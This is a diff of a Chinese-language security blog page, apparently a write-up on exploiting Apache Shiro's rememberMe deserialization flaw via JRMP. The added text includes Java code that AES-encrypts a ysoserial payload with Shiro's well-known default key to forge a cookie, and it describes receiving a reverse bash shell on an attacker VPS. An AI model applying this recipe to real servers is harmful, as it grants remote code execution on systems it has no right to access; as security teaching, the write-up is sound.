@@ -350,7 +350,8 @@
               
               <p>&nbsp;&nbsp;&nbsp;这里有个比较坑的地方，构造CC1链的payload打过去发现报错了。
                 搜了一下相关原因并检查了一下，发现shiro中ClassResolvingObjectInputStream类继承ObjectInputStream类，
-                并且resolveClass被重写，所以需要做一些修改。如果要用cc链的话，需要修改transformers数组(无法加载除Java本身自带的数组)。</p>
+                并且resolveClass被重写，所以需要做一些修改。如果要用cc链的话，需要修改transformers数组(无法加载除Java本身自带的数组)。
+                直接用JRMP打或者原生利用链也是可以的。</p>
               
               
               <a data-fancybox="gallery" href="../img/2022-3-6/8.jpg">
@@ -358,14 +359,44 @@
               </a>  
               
               
-              <p>&nbsp;&nbsp;&nbsp;或者直接用JRMP打</p>
+              <p>&nbsp;&nbsp;&nbsp;这里演示一下JRMP的打法，首先VPS开启JRMPListener。</p>
               
               
-              <a data-fancybox="gallery" href="../img/2022-3-6/8.jpg">
-                <img class="img-fluid" src="../img/2022-3-6/8.jpg">
-              </a>  
+              <a data-fancybox="gallery" href="../img/2022-3-6/11.jpg">
+                <img class="img-fluid" src="../img/2022-3-6/11.jpg">
+              </a>
               
+              <p>&nbsp;&nbsp;&nbsp;对ysoserial生成的JRMPClient序列化文件进行编码。</p>
+              
+              
+              <div>
+              	
+                <pre class='hljs'><code><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> FileEncode() <span class="hljs-keyword">throws</span> IOException {
+    <span class="hljs-keyword">File</span> <span class="hljs-keyword">file</span> = <span class="hljs-keyword">new</span> <span class="hljs-keyword">File</span>(<span class="hljs-string">"./shiro"</span>);
+    FileInputStream inputFile = <span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-keyword">file</span>);
+    <span class="hljs-keyword">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[(<span class="hljs-keyword">int</span>)<span class="hljs-keyword">file</span>.length()];
+    inputFile.<span class="hljs-keyword">read</span>(buffer);
+    AesCipherService aes = <span class="hljs-keyword">new</span> AesCipherService();
+    <span class="hljs-keyword">byte</span>[] key =java.util.Base64.getDecoder().decode(<span class="hljs-string">"kPH+bIxk5D2deZiIxcaaaA=="</span>);
+    ByteSource ciphertext = aes.encrypt(buffer, key);
+    System.out.printf(ciphertext.toString());
+}</code></pre>
                 
+                
+              </div>
+              
+              
+              
+              
+              <p>&nbsp;&nbsp;&nbsp;用生成的cookie打过去，VPS接收TCP传来的bash。</p>
+              
+              
+              <a data-fancybox="gallery" href="../img/2022-3-6/12.jpg">
+                <img class="img-fluid" src="../img/2022-3-6/12.jpg">
+              </a>  
+              
+              
+              
                 
                 
               <h2 class="section-heading">EXP问题</h2>
